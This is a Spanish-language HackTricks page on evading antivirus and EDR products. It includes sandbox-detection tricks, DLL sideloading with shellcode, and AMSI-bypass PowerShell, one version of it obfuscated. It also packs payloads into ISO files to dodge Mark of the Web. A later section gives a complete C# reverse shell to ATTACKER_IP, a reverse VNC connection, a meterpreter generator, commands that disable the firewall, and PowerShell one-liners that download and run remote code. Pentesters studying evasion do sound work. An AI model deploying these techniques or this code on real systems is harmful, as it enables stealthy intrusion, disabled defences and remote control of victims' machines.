# **Bypass de Antivirus (AV)**

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Esta página fue escrita por** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**!**

## **Metodología de Evasión de AV**

Actualmente, los AV utilizan diferentes métodos para verificar si un archivo es malicioso o no, detección estática, análisis dinámico y para los EDR más avanzados, análisis de comportamiento.

### **Detección estática**

La detección estática se logra marcando cadenas conocidas maliciosas o matrices de bytes en un binario o script, y también extrayendo información del archivo en sí (por ejemplo, descripción del archivo, nombre de la empresa, firmas digitales, icono, suma de comprobación, etc.). Esto significa que el uso de herramientas públicas conocidas puede hacer que te descubran más fácilmente, ya que probablemente hayan sido analizadas y marcadas como maliciosas. Hay un par de formas de evitar este tipo de detección:

* **Cifrado**

Si cifras el binario, no habrá forma de que el AV detecte tu programa, pero necesitarás algún tipo de cargador para descifrar y ejecutar el programa en memoria.

* **Ofuscación**

A veces todo lo que necesitas hacer es cambiar algunas cadenas en tu binario o script para que pase desapercibido por el AV, pero esta tarea puede llevar mucho tiempo dependiendo de lo que estés tratando de ofuscar.

* **Herramientas personalizadas**

Si desarrollas tus propias herramientas, no habrá firmas maliciosas conocidas, pero esto requiere mucho tiempo y esfuerzo.

{% hint style="info" %}
Una buena forma de verificar contra la detección estática de Windows Defender es [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Básicamente divide el archivo en múltiples segmentos y luego le pide a Defender que escanee cada uno individualmente, de esta manera, puede decirte exactamente cuáles son las cadenas o bytes marcados en tu binario.
{% endhint %}

Recomiendo encarecidamente que veas esta [lista de reproducción de YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) sobre la evasión práctica de AV.

### **Análisis dinámico**

El análisis dinámico es cuando el AV ejecuta tu binario en un sandbox y observa la actividad maliciosa (por ejemplo, intentar descifrar y leer las contraseñas de tu navegador, realizar un minivolcado en LSASS, etc.). Esta parte puede ser un poco más complicada de trabajar, pero aquí hay algunas cosas que puedes hacer para evadir los sandboxes.

* **Esperar antes de la ejecución** Dependiendo de cómo esté implementado, puede ser una excelente manera de eludir el análisis dinámico del AV. Los AV tienen muy poco tiempo para escanear archivos para no interrumpir el flujo de trabajo del usuario, por lo que usar esperas largas puede perturbar el análisis de los binarios. El problema es que muchos sandboxes de AV pueden simplemente omitir la espera dependiendo de cómo esté implementada.
* **Verificación de recursos de la máquina** Por lo general, los sandboxes tienen muy pocos recursos para trabajar (por ejemplo, < 2GB de RAM), de lo contrario podrían ralentizar la máquina del usuario. También puedes ser muy creativo aquí, por ejemplo, verificando la temperatura de la CPU o incluso las velocidades del ventilador, no todo estará implementado en el sandbox.
* **Verificaciones específicas de la máquina** Si deseas apuntar a un usuario cuya estación de trabajo está unida al dominio "contoso.local", puedes verificar el dominio de la computadora para ver si coincide con el que has especificado, si no lo hace, puedes hacer que tu programa se cierre.

Resulta que el nombre de la computadora del Sandbox de Microsoft Defender es HAL9TH, por lo tanto, puedes verificar el nombre de la computadora en tu malware antes de la detonación, si el nombre coincide con HAL9TH, significa que estás dentro del sandbox del defensor, por lo que puedes hacer que tu programa se cierre.

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>fuente: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Algunos otros consejos realmente buenos de [@mgeeky](https://twitter.com/mariuszbit) para enfrentarse a los Sandboxes

<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canal #malware-dev</p></figcaption></figure>

Como hemos mencionado anteriormente en esta publicación, las **herramientas públicas** eventualmente **serán detectadas**, por lo tanto, deberías preguntarte algo:

Por ejemplo, si deseas volcar LSASS, ¿realmente necesitas usar mimikatz? ¿O podrías usar un proyecto diferente que sea menos conocido y también volque LSASS.

La respuesta correcta probablemente sea la última. Tomando mimikatz como ejemplo, probablemente sea uno de, si no el malware más marcado por los AV y EDR, aunque el proyecto en sí es genial, también es una pesadilla trabajar con él para evadir los AV, así que busca alternativas para lo que estás tratando de lograr.

{% hint style="info" %}
Cuando modifiques tus payloads para la evasión, asegúrate de **desactivar el envío automático de muestras** en defender, y por favor, en serio, **NO SUBAS A VIRUSTOTAL** si tu objetivo es lograr la evasión a largo plazo. Si deseas verificar si tu payload es detectado por un AV en particular, instálalo en una VM, intenta desactivar el envío automático de muestras y pruébalo allí hasta que estés satisfecho con el resultado.
{% endhint %}

## EXEs vs DLLs

Siempre que sea posible, **prioriza el uso de DLLs para la evasión**, en mi experiencia, los archivos DLL suelen ser **mucho menos detectados** y analizados, por lo que es un truco muy simple de usar para evitar la detección en algunos casos (si tu payload tiene alguna forma de ejecutarse como DLL, por supuesto).

Como podemos ver en esta imagen, un Payload DLL de Havoc tiene una tasa de detección de 4/26 en antiscan.me, mientras que el payload EXE tiene una tasa de detección de 7/26.

<figure><img src="../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption><p>comparación de antiscan.me de un payload EXE normal de Havoc vs un DLL normal de Havoc</p></figcaption></figure>

Ahora mostraremos algunos trucos que puedes usar con archivos DLL para ser mucho más sigiloso.

## Carga Lateral y Proxying de DLL

**La carga lateral de DLL** aprovecha el orden de búsqueda de DLL utilizado por el cargador al posicionar tanto la aplicación víctima como las cargas maliciosas junto a ella.

Puedes verificar programas susceptibles a la carga lateral de DLL utilizando [Siofra](https://github.com/Cybereason/siofra) y el siguiente script de PowerShell:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

Este comando mostrará la lista de programas susceptibles a la suplantación de DLL dentro de "C:\Program Files\\" y los archivos DLL que intentan cargar.

Recomiendo encarecidamente que **explorar los programas DLL Hijackable/Sideloadable por ti mismo**, esta técnica es bastante sigilosa si se hace correctamente, pero si utilizas programas DLL Sideloadable conocidos públicamente, puedes ser descubierto fácilmente.

Simplemente colocar una DLL maliciosa con el nombre que un programa espera cargar, no cargará tu carga útil, ya que el programa espera algunas funciones específicas dentro de esa DLL, para solucionar este problema, utilizaremos otra técnica llamada **DLL Proxying/Forwarding**.

**DLL Proxying** redirige las llamadas que un programa realiza desde la DLL de proxy (y maliciosa) a la DLL original, preservando así la funcionalidad del programa y pudiendo manejar la ejecución de tu carga útil.

Voy a utilizar el proyecto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Estos son los pasos que seguí:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

El último comando nos dará 2 archivos: una plantilla de código fuente DLL y la DLL original renombrada.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

Estos son los resultados:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

¡Tanto nuestro shellcode (codificado con [SGN](https://github.com/EgeBalci/sgn)) como el proxy DLL tienen una tasa de detección de 0/26 en [antiscan.me](https://antiscan.me)! Yo llamaría a eso un éxito.

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**Recomiendo encarecidamente** que veas el VOD de [twitch de S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading y también el [video de ippsec](https://www.youtube.com/watch?v=3eROsG\_WNpE) para aprender más sobre lo que hemos discutido de manera más profunda.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze es un kit de herramientas de carga útil para evadir EDRs utilizando procesos suspendidos, syscalls directos y métodos de ejecución alternativos`

Puedes usar Freeze para cargar y ejecutar tu shellcode de manera sigilosa.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
La evasión es solo un juego del gato y el ratón, lo que funciona hoy podría ser detectado mañana, por lo tanto, nunca confíes solo en una herramienta, si es posible, intenta encadenar múltiples técnicas de evasión.
{% endhint %}

## AMSI (Interfaz de Escaneo Antimalware)

AMSI fue creado para prevenir el "[malware sin archivo](https://en.wikipedia.org/wiki/Fileless\_malware)". Inicialmente, los AV solo podían escanear **archivos en disco**, por lo que si de alguna manera podías ejecutar cargas útiles **directamente en la memoria**, el AV no podía hacer nada para evitarlo, ya que no tenía suficiente visibilidad.

La característica AMSI está integrada en estos componentes de Windows.

- Control de cuentas de usuario, o UAC (elevación de instalación de EXE, COM, MSI o ActiveX)
- PowerShell (scripts, uso interactivo y evaluación de código dinámico)
- Windows Script Host (wscript.exe y cscript.exe)
- JavaScript y VBScript
- Macros de Office VBA

Permite a las soluciones antivirus inspeccionar el comportamiento de los scripts exponiendo el contenido del script de una forma que no está encriptada ni ofuscada.

Ejecutar `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` producirá la siguiente alerta en Windows Defender.

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

Observa cómo antepone `amsi:` y luego la ruta al ejecutable desde el cual se ejecutó el script, en este caso, powershell.exe

No dejamos ningún archivo en disco, pero aún así fuimos detectados en memoria debido a AMSI.

Hay un par de formas de evadir AMSI:

- **Ofuscación**

Dado que AMSI funciona principalmente con detecciones estáticas, modificar los scripts que intentas cargar puede ser una buena forma de evadir la detección.

Sin embargo, AMSI tiene la capacidad de desofuscar scripts incluso si tienen múltiples capas, por lo que la ofuscación podría ser una mala opción dependiendo de cómo se haga. Esto hace que no sea tan sencillo evadirlo. Aunque, a veces, todo lo que necesitas hacer es cambiar un par de nombres de variables y estarás bien, por lo que depende de cuánto haya sido marcado algo.

- **Bypass de AMSI**

Dado que AMSI se implementa cargando una DLL en el proceso de powershell (también cscript.exe, wscript.exe, etc.), es posible manipularlo fácilmente incluso ejecutándose como un usuario sin privilegios. Debido a esta falla en la implementación de AMSI, los investigadores han encontrado múltiples formas de evadir el escaneo de AMSI.

**Forzar un Error**

Forzar que la inicialización de AMSI falle (amsiInitFailed) hará que no se inicie ningún escaneo para el proceso actual. Originalmente esto fue divulgado por [Matt Graeber](https://twitter.com/mattifestation) y Microsoft ha desarrollado una firma para prevenir un uso más amplio.

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

Todo lo que se necesitó fue una línea de código de PowerShell para desactivar AMSI para el proceso actual de PowerShell. Esta línea, por supuesto, ha sido detectada por AMSI, por lo que se necesita alguna modificación para poder utilizar esta técnica.

Aquí tienes un bypass modificado de AMSI que saqué de este [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**Parcheo de Memoria**

Esta técnica fue descubierta inicialmente por [@RastaMouse](https://twitter.com/\_RastaMouse/) e implica encontrar la dirección de la función "AmsiScanBuffer" en amsi.dll (responsable de escanear la entrada suministrada por el usuario) y sobrescribirla con instrucciones para devolver el código E\_INVALIDARG, de esta manera, el resultado del escaneo real devolverá 0, que se interpreta como un resultado limpio.

{% hint style="info" %}
Por favor, lee [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para una explicación más detallada.
{% endhint %}

También existen muchas otras técnicas utilizadas para evadir AMSI con powershell, consulta [**esta página**](basic-powershell-for-pentesters/#amsi-bypass) y [este repositorio](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para aprender más sobre ellas.

O este script que a través del parcheo de memoria parcheará cada nuevo Powersh

## Ofuscación

Existen varias herramientas que se pueden utilizar para **ofuscar código en texto claro de C#**, generar **plantillas de metaprogramación** para compilar binarios u **ofuscar binarios compilados** como:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: Ofuscador de C#**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): El objetivo de este proyecto es proporcionar un fork de código abierto del conjunto de compilación [LLVM](http://www.llvm.org/) capaz de proporcionar una mayor seguridad del software a través de la [ofuscación de código](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) y protección contra manipulaciones.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demuestra cómo utilizar el lenguaje `C++11/14` para generar, en tiempo de compilación, código ofuscado sin utilizar ninguna herramienta externa y sin modificar el compilador.
* [**obfy**](https://github.com/fritzone/obfy): Agrega una capa de operaciones ofuscadas generadas por el marco de metaprogramación de plantillas de C++ que dificultará la vida de la persona que quiera crackear la aplicación.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz es un ofuscador binario x64 que es capaz de ofuscar varios archivos pe diferentes, incluyendo: .exe, .dll, .sys
* [**metame**](https://github.com/a0rtega/metame): Metame es un motor de código metamórfico simple para ejecutables arbitrarios.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator es un marco de ofuscación de código de grano fino para lenguajes admitidos por LLVM que utilizan ROP (programación orientada a la devolución). ROPfuscator ofusca un programa a nivel de código de ensamblaje transformando instrucciones regulares en cadenas ROP, frustrando nuestra concepción natural del flujo de control normal.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt es un Crypter PE de .NET escrito en Nim
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor es capaz de convertir EXE/DLL existentes en shellcode y luego cargarlos

## SmartScreen y MoTW

Es posible que hayas visto esta pantalla al descargar algunos ejecutables de Internet y ejecutarlos.

Microsoft Defender SmartScreen es un mecanismo de seguridad destinado a proteger al usuario final contra la ejecución de aplicaciones potencialmente maliciosas.

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

SmartScreen funciona principalmente con un enfoque basado en la reputación, lo que significa que las aplicaciones descargadas de forma poco común activarán SmartScreen, alertando así y evitando que el usuario final ejecute el archivo (aunque el archivo aún se puede ejecutar haciendo clic en Más información -> Ejecutar de todos modos).

**MoTW** (Mark of The Web) es un [NTFS Alternate Data Stream](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) con el nombre de Zone.Identifier que se crea automáticamente al descargar archivos de Internet, junto con la URL desde la que se descargó.

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>Comprobando el ADS Zone.Identifier de un archivo descargado de Internet.</p></figcaption></figure>

{% hint style="info" %}
Es importante tener en cuenta que los ejecutables firmados con un certificado de firma **confiable** no activarán SmartScreen.
{% endhint %}

Una forma muy efectiva de evitar que tus cargas útiles reciban la Marca de la Web es empaquetarlas dentro de algún tipo de contenedor como un ISO. Esto sucede porque la Marca de la Web (MOTW) **no** se puede aplicar a volúmenes **no NTFS**.

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) es una herramienta que empaqueta cargas útiles en contenedores de salida para evadir la Marca de la Web.

Uso de ejemplo:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Aquí tienes una demostración para evadir SmartScreen empaquetando payloads dentro de archivos ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## Reflexión de Ensamblado C# 

Cargar binarios C# en memoria ha sido conocido desde hace bastante tiempo y sigue siendo una excelente manera de ejecutar tus herramientas de post-explotación sin ser detectado por el AV.

Dado que el payload se cargará directamente en memoria sin tocar el disco, solo tendremos que preocuparnos por parchear AMSI para todo el proceso.

La mayoría de los marcos de C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) ya proporcionan la capacidad de ejecutar ensamblados C# directamente en memoria, pero hay diferentes formas de hacerlo:

* **Fork\&Run**

Implica **crear un nuevo proceso sacrificial**, inyectar tu código malicioso de post-explotación en ese nuevo proceso, ejecutar tu código malicioso y cuando haya terminado, matar el nuevo proceso. Esto tiene tanto sus beneficios como sus inconvenientes. El beneficio del método fork and run es que la ejecución ocurre **fuera** de nuestro proceso de implante Beacon. Esto significa que si algo en nuestra acción de post-explotación sale mal o es detectado, hay una **mayor probabilidad** de que nuestro **implante sobreviva**. La desventaja es que tienes una **mayor probabilidad** de ser detectado por **Detecciones de Comportamiento**.

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Inline**

Se trata de inyectar el código malicioso de post-explotación **en su propio proceso**. De esta manera, puedes evitar tener que crear un nuevo proceso y que sea escaneado por el AV, pero la desventaja es que si algo sale mal con la ejecución de tu payload, hay una **mayor probabilidad** de **perder tu beacon** ya que podría fallar.

<figure><img src="../.gitbook/assets/image (9) (3) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Si deseas leer más sobre la carga de Ensamblados C#, por favor revisa este artículo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) y su BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

También puedes cargar Ensamblados C# **desde PowerShell**, revisa [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) y el [video de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Uso de Otros Lenguajes de Programación

Como se propone en [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), es posible ejecutar código malicioso utilizando otros lenguajes al darle a la máquina comprometida acceso **al entorno del intérprete instalado en el recurso SMB controlado por el Atacante**.&#x20;

Al permitir el acceso a los Binarios del Intérprete y al entorno en el recurso SMB, puedes **ejecutar código arbitrario en estos lenguajes dentro de la memoria** de la máquina comprometida.

El repositorio indica: Defender aún escanea los scripts pero al utilizar Go, Java, PHP, etc. tenemos **más flexibilidad para evadir firmas estáticas**. La prueba con scripts de shell inverso aleatorios y no obfuscados en estos lenguajes ha sido exitosa.

## Evasión Avanzada

La evasión es un tema muy complicado, a veces debes tener en cuenta muchas fuentes diferentes de telemetría en un solo sistema, por lo que es prácticamente imposible permanecer completamente indetectable en entornos maduros.

Cada entorno contra el que te enfrentes tendrá sus propias fortalezas y debilidades.

Te animo encarecidamente a ver esta charla de [@ATTL4S](https://twitter.com/DaniLJ94), para adentrarte en técnicas de Evasión Avanzada.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

También es otra gran charla de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasión en Profundidad.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Técnicas Antiguas**

### **Verificar qué partes encuentra Defender como maliciosas**

Puedes usar [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) que **eliminará partes del binario** hasta que **descubra qué parte encuentra Defender** como maliciosa y te lo dividirá.\
Otra herramienta que hace lo **mismo es** [**avred**](https://github.com/dobin/avred) con un servicio web abierto que ofrece el servicio en [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Haz que **empiece** cuando se inicie el sistema y **ejecútalo** ahora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambiar el puerto de telnet** (sigiloso) y deshabilitar el firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Descárgalo desde: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (descarga los binarios, no la configuración)

**EN EL HOST**: Ejecuta _**winvnc.exe**_ y configura el servidor:

* Habilita la opción _Disable TrayIcon_
* Establece una contraseña en _VNC Password_
* Establece una contraseña en _View-Only Password_

Luego, mueve el binario _**winvnc.exe**_ y el archivo recién creado _**UltraVNC.ini**_ dentro del **víctima**

#### **Conexión inversa**

El **atacante** debe **ejecutar dentro** de su **host** el binario `vncviewer.exe -listen 5900` para estar **preparado** para capturar una conexión **VNC inversa**. Luego, dentro del **víctima**: Inicia el demonio winvnc `winvnc.exe -run` y ejecuta `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ADVERTENCIA:** Para mantener el sigilo, no debes hacer algunas cosas

* No inicies `winvnc` si ya está en ejecución o activarás una [ventana emergente](https://i.imgur.com/1SROTTl.png). verifica si está en ejecución con `tasklist | findstr winvnc`
* No inicies `winvnc` sin tener `UltraVNC.ini` en el mismo directorio o causará que se abra [la ventana de configuración](https://i.imgur.com/rfMQWcf.png)
* No ejecutes `winvnc -h` para obtener ayuda o activarás una [ventana emergente](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Descárgalo desde: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro de GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ahora **inicia el escucha** con `msfconsole -r file.rc` y **ejecuta** el **payload xml** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**El defensor actual terminará el proceso muy rápido.**

### Compilando nuestro propio shell inverso

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primer shell inverso en C#

Compílalo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Úselo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando el compilador
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Descarga y ejecución automática:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

Lista de ofuscadores de C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
